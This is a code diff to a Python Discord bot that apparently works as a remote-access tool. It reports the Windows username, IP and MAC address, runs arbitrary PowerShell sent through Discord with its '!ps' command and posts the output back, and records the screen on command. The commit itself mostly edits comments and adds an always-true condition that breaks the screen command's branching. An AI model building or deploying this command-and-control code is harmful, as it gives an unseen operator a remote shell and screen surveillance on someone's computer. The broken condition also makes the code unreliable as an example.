@@ -12,23 +12,22 @@ import numpy as np
 from datetime import datetime
 from discord.ext import commands
 
-# Setting const (a constant cant be changed in runtime)
+# Constants
 TOKEN = "token" # Discord bot token
 USERNAME = os.getenv("USERNAME")  # Windows username
 GUILD_ID = "GUILD_ID"  # Replace with your actual server ID
 
-# Bot setup with proper intents (intents = the rights the discord bot has)
+# Variables
 intents = discord.Intents.default()
-intents.messages = True  # Required for reading messages
-intents.message_content = True # Allows the bot to read message content from discord channel
-intents.guilds = True # # Enables interaction with guilds (discord server)
+intents.messages = True
+intents.message_content = True # Allow bot to read messages from discord channel
+intents.guilds = True # Enables interaction with discord server
+bot = commands.Bot(command_prefix='!', intents=intents) # Bot prefix
 
-# Setting the prifix to recieve commands
-bot = commands.Bot(command_prefix='!', intents=intents)
-
-# Function to get the local machine's IP address
-# Note! it gets private ip make it so it will also get public
+# Functions
 def get_ip_address():
+    # Function to get the local machine's IP address
+    # Note! it gets private ip make it so it will also get public
     try:
         hostname = socket.gethostname() # Get the hostname of the machine
         ip_address = socket.gethostbyname(hostname) # Get the IP address associated with the hostname
@@ -36,8 +35,8 @@ def get_ip_address():
     except Exception as e: # error handling for the get_ip_address function
         return f"Error getting IP address: {e}"
 
-# Gets local machine's mac-address
 def get_mac_address():
+    # Gets local machine's mac-address
     try:
         # Getting mac-address using the uuid lib
         mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1])
@@ -46,10 +45,9 @@ def get_mac_address():
         return f"Error getting MAC address: {e}"
 
 async def main_loop():
-    """Main loop of the program"""
     while True:
         print("Hallo")
-        await asyncio.sleep(5)  # Wait for 5 seconds
+        await asyncio.sleep(5)
 
 @bot.command()
 async def what(ctx):
@@ -58,35 +56,27 @@ async def what(ctx):
 
 @bot.command()
 async def whoami(ctx):
-    """Sends a greeting message"""
     await ctx.send(f"I am: {USERNAME} 👋")
 
 @bot.command()
 async def send_message(ctx, *, message: str):
-    """Send a custom message in the current channel"""
     await ctx.send(f"Sending message: {message}")
 
 @bot.command()
 async def ps(ctx, *, code: str):
-    """Executes PowerShell code and sends the output to the webhook."""
-    
     try:
-        # Ensure code is wrapped properly for execution
-        # This will pass the PowerShell command as a single string to the PowerShell process
         process = await asyncio.create_subprocess_exec(
             'powershell', '-NoProfile', '-Command', code,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE
         )
 
-        # Capture the standard output and error
+        # get output and/or error
         stdout, stderr = await process.communicate()
 
-        # Decode the byte output to string
+        # Decode output to string
         output = stdout.decode('utf-8').strip()
         error = stderr.decode('utf-8').strip()
-
-        # Prepare the final message with either the output or error
         if output:
             result_message = f"**Output:**\n{output}"
         elif error:
@@ -94,7 +84,7 @@ async def ps(ctx, *, code: str):
         else:
             result_message = "No output or error from the PowerShell command."
 
-        # Send the result to the bot
+        # Send to bot
         await ctx.send(result_message)
     
     except Exception as e:
@@ -102,7 +92,6 @@ async def ps(ctx, *, code: str):
 
 @bot.command()
 async def stopbot(ctx):
-    """Stops the bot."""
     await ctx.send("Shutting down the bot...")
     await bot.close()
 
@@ -158,7 +147,6 @@ recording_task = None  # This will store the current recording task
 
 @bot.command()
 async def screen(ctx, action: str):
-    """Starts or stops screen recording."""
     global recording_task  # To access the global task variable
     rec = False
 
@@ -177,13 +165,13 @@ async def screen(ctx, action: str):
             if recording_task is None or recording_task.done():
                 await ctx.send("❌ No recording is currently in progress!")
                 return
-
             # Stop the recording task by setting rec to False
             rec = False
             await ctx.send("✅ Stopping the recording")
             recording_task.cancel()  # This will stop the recording task
             await recording_task  # Wait for the task to finish properly
-
+        elif action != "start" or "stop":
+            await ctx.send("❌ Use 'start' or 'stop'!")
         else:
             await ctx.send("❌ Only use 'start' or 'stop'!")
 
@@ -192,7 +180,6 @@ async def screen(ctx, action: str):
 
 
 async def record_screen(ctx, rec: bool):
-    """Handles the screen recording process."""
     try:
         # Define the output file name with a timestamp
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
